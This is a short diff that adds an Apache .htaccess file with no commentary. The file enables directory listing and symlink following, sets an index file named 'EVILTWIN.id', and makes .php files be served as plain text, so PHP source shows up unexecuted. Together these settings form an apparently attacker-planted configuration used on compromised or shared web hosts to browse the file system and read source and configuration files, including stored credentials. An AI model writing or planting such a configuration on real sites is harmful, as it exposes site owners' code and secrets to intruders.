@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex EVILTWIN.id
+AddType txt .php
+AddHandler txt .php
